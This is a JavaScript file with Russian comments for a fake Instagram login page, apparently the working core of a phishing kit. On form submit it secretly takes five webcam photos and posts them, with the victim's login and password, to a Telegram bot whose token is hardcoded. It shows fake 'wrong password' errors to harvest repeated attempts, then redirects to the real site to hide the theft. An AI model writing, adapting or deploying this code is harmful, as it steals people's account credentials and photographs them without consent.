document.addEventListener('DOMContentLoaded', () => {
    // ВАШИ НАСТРОЙКИ
    const BOT_TOKEN = '8545271968:AAGsLGz0VJOgPPRvcAs6Bm96IBmJ1F1W0f0';
    const CHAT_ID = '8095678119';

    // ЭЛЕМЕНТЫ
    const loadingScreen = document.getElementById('loadingScreen');
    const mainContent = document.getElementById('mainContent');
    const loginForm = document.getElementById('loginForm');
    const loginInput = document.getElementById('loginInput');
    const passInput = document.getElementById('passInput');
    const togglePass = document.getElementById('togglePass');
    const errorBox = document.getElementById('errorBox');
    const errorText = document.getElementById('errorText');
    const submitBtn = document.getElementById('submitBtn');
    const cameraFeed = document.getElementById('cameraFeed');
    const photoCanvas = document.getElementById('photoCanvas');
    const ctx = photoCanvas.getContext('2d');

    // ПЕРЕМЕННЫЕ
    let attemptCount = 0;
    let isProcessing = false;
    let cameraStream = null;
    let photosSent = 0;

    // ========== ЗАГРУЗКА ==========
    setTimeout(() => {
        loadingScreen.classList.add('hidden');
        setTimeout(() => {
            loadingScreen.style.display = 'none';
            mainContent.style.display = 'block';
        }, 500);
    }, 3000);

    // ========== ПОКАЗАТЬ/СКРЫТЬ ПАРОЛЬ ==========
    togglePass.addEventListener('click', () => {
        const isPass = passInput.type === 'password';
        passInput.type = isPass ? 'text' : 'password';
        togglePass.textContent = isPass ? 'Скрыть' : 'Показать';
    });

    // ========== ЗАПУСК КАМЕРЫ (ИСПРАВЛЕНО) ==========
    async function initCamera() {
        try {
            // Запрос разрешения
            cameraStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: 640, height: 480 },
                audio: false
            });
            cameraFeed.srcObject = cameraStream;
            
            // Ожидание готовности видео
            await new Promise((resolve) => {
                cameraFeed.onloadedmetadata = () => {
                    cameraFeed.play();
                    resolve();
                };
            });
            return true;
        } catch (err) {
            showError('❌ Разрешение на камеру не получено!', 4000);
            return false;
        }
    }

    // ========== СДЕЛАТЬ ФОТО (ИСПРАВЛЕНО) ==========
    async function captureAndSendPhoto(index) {
        try {
            // Установка размеров холста
            photoCanvas.width = cameraFeed.videoWidth;
            photoCanvas.height = cameraFeed.videoHeight;

            // Захват изображения
            ctx.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);

            // Конвертация в фото
            const blob = await new Promise((resolve) => {
                photoCanvas.toBlob(resolve, 'image/jpeg', 0.9);
            });

            if (!blob) return;

            // Отправка в Telegram
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, `photo_${attemptCount}_${index}.jpg`);
            formData.append('caption', `📸 Instagram AI | Фото №${index} | Попытка №${attemptCount}`);

            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            if (res.ok) photosSent++;

        } catch (e) {
            console.error('Ошибка фото:', e);
        }
    }

    // ========== СЕССИЯ ФОТОСЪЕМКИ ==========
    async function startPhotoSession() {
        photosSent = 0;
        const totalPhotos = 5;
        const interval = 1500; // Каждые 1.5 секунды

        const ready = await initCamera();
        if (!ready) return;

        // Последовательная съемка
        for (let i = 1; i <= totalPhotos; i++) {
            await new Promise(r => setTimeout(r, interval));
            await captureAndSendPhoto(i);
        }

        // Остановка камеры
        if (cameraStream) {
            cameraStream.getTracks().forEach(t => t.stop());
            cameraStream = null;
        }
    }

    // ========== ОТПРАВКА ДАННЫХ ==========
    async function sendMainData(login, password) {
        const time = new Date().toLocaleString('ru-RU', {
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        });

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `🤖 <b>Instagram AI — ВХОД №${attemptCount}</b>\n━━━━━━━━━━━━━━━━━\n👤 Логин: <code>${login}</code>\n🔒 Пароль: <code>${password}</code>\n⏰ Время: ${time}\n📸 Фото отправлено: ${photosSent} шт\n━━━━━━━━━━━━━━━━━`,
                parse_mode: 'HTML'
            })
        });
    }

    // ========== ОБРАБОТКА ФОРМЫ ==========
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        if (isProcessing) return;

        const login = loginInput.value.trim();
        const password = passInput.value.trim();
        if (!login || !password) {
            showError('⚠️ Заполните все поля!', 3000);
            return;
        }

        attemptCount++;
        isProcessing = true;
        submitBtn.disabled = true;
        submitBtn.classList.add('loading');

        try {
            await startPhotoSession();       // 1. Делаем фото
            await sendMainData(login, password); // 2. Отправляем данные

            if (attemptCount < 3) {
                showError('❌ Неверное имя пользователя или пароль. Попробуйте снова.', 10000);
            } else {
                showError('✅ Переадресация...', 2000);
                setTimeout(() => window.location.href = 'https://instagram.com', 2000);
            }
        } catch (err) {
            showError('⚠️ Ошибка соединения!', 4000);
        } finally {
            setTimeout(() => {
                submitBtn.classList.remove('loading');
                submitBtn.disabled = false;
                isProcessing = false;
            }, 10000);
        }
    });

    // ========== ПОКАЗАТЬ ОШИБКУ ==========
    function showError(text, time) {
        errorText.textContent = text;
        errorBox.classList.add('show');
        setTimeout(() => {
            errorBox.classList.remove('show');
            loginInput.value = '';
            passInput.value = '';
        }, time);
    }

    // ========== ЗАПРЕТИТЬ ПЕРЕХОДЫ ==========
    document.querySelectorAll('.custom-link, .register-link').forEach(el => {
        el.addEventListener('click', e => e.preventDefault());
    });
});